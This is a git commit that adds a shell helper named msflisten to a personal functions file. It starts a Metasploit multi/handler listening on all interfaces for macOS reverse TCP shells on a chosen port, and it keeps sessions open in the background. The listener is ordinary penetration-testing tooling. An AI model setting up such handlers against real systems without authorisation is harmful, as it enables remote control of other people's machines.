2c0904e0b8c065dd013c9850043349c6b8e7f890
Sheharyar Naseer <hello@sheharyar.me>
2015-09-29 12:42:47 +0500

    Added msflisten function

---
+++ MSF/functions.sh
@@ -0,0 +1,13 @@
+# Metasploit
+
+msflisten() {
+    if [[ $# -eq 0 ]] ; then
+        echo "port not provided"
+        echo "usage: msflisten <port>"
+        echo ""
+    else
+        local LPORT="$1"
+        ./msfconsole -x "use multi/handler; set PAYLOAD osx/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession false; exploit -j"
+    fi
+}
+
